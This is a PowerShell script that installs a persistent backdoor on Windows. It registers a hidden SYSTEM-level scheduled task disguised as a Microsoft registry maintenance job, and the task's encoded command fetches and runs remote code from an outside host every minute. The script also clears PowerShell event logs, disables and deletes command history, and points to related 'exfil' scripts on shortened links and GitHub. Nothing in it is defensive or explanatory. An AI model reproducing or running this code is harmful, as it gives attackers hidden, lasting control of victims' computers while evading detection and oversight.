<# Creates Core task. 
IMPORTANT LINKS
https://tinyurl.com/highcmdctrl <> MasterControl.ps1
https://tinyurl.com/highcmdpinstall <> AutomatedTaskWithPingInstall.ps1
https://tinyurl.com/highcmdvinstall <> TaskSchedulerServiceCreator.ps1
https://tinyurl.com/highcmdactivation <> ActivationWithAutomatedInstall.ps1
#>

# Encoded Command
<#
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent    
while ($true) {
    $url = "https://hook.short.gy/gitexfil"
    $response = Invoke-WebRequest -Uri $url -UseBasicParsing
    if ($response.StatusCode -eq 200) {
        $scriptContent = $response.Content
        Invoke-Expression $scriptContent
    } else {}
    Start-Sleep -Seconds 60 | Out-Null
}
#>

# Variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$username = ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
$psreadlineFolderPath = Join-Path -Path $username -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
$localtask = "RegBackupVerifier"
$taskpath = "\Microsoft\Windows\Registry"
$scheduleObject = New-Object -ComObject schedule.service
$scheduleObject.Connect()
$rootFolder = $scheduleObject.GetFolder("\")

############# Scripts starts from here.
#Task scheduling
$rawscript = @'
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Periodic maintenance task.</Description>
    <URI>\RegBackupVerifier</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Repetition>
        <Interval>PT30M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
    </BootTrigger>
    <EventTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='NetworkProfile'] and EventID=1000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
    <RegistrationTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>0</Priority>
    <RestartOnFailure>
      <Interval>PT5M</Interval>
      <Count>9999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JEF2YWlsYWJsZVRscyA9IFtlbnVtXTo6R2V0VmFsdWVzKCdOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGUnKSB8IFdoZXJlLU9iamVjdCB7ICRfIC1nZSAnVGxzMTInIH0NCmZvcmVhY2ggKCR0bHNQcm90b2NvbCBpbiAkQXZhaWxhYmxlVGxzKSB7W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAkdGxzUHJvdG9jb2x9DQpTZXQtUFNSZWFkTGluZU9wdGlvbiAtSGlzdG9yeVNhdmVTdHlsZSBTYXZlTm90aGluZyB8IE91dC1OdWxsDQpDbGVhci1FdmVudExvZyAiV2luZG93cyBQb3dlcnNoZWxsIg0KJExvZ0VuZ2luZUxpZmVjeWNsZUV2ZW50ID0gJGZhbHNlIHwgT3V0LU51bGwNClt2b2lkXSRMb2dFbmdpbmVMaWZlY3ljbGVFdmVudCAgICANCndoaWxlICgkdHJ1ZSkgew0KICAgICR1cmwgPSAiaHR0cHM6Ly9ob29rLnNob3J0Lmd5L2dpdGV4ZmlsIg0KICAgICRyZXNwb25zZSA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtVXNlQmFzaWNQYXJzaW5nDQogICAgaWYgKCRyZXNwb25zZS5TdGF0dXNDb2RlIC1lcSAyMDApIHsNCiAgICAgICAgJHNjcmlwdENvbnRlbnQgPSAkcmVzcG9uc2UuQ29udGVudA0KICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkc2NyaXB0Q29udGVudA0KICAgIH0gZWxzZSB7fQ0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYwIHwgT3V0LU51bGwNCn0=</Arguments>
    </Exec>
  </Actions>
</Task>
'@

# Registering the scheduled task.
try {$null = $scheduleObject.GetFolder($taskpath)} catch {$null = $rootFolder.CreateFolder($taskpath)}
Get-ScheduledTask -TaskName $localtask -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue  | Out-Null
Register-ScheduledTask -TaskName $localtask -Xml $rawscript -TaskPath $taskpath -Force -ErrorAction SilentlyContinue -AsJob | Out-Null
Start-ScheduledTask -TaskPath $taskpath -TaskName $localtask -ErrorAction SilentlyContinue
#(Get-ScheduledTask -TaskName $localtask).state
#Invoke-Expression(Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/DeprecCoreTaskPurge.ps1" -UseBasicParsing).Content -AsJob

# cleanup
if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
  $files = Get-ChildItem -Path $psreadlineFolderPath
  if ($files.Count -gt 0) {
    Remove-Item -Path "$psreadlineFolderPath\*" -Force
  }
}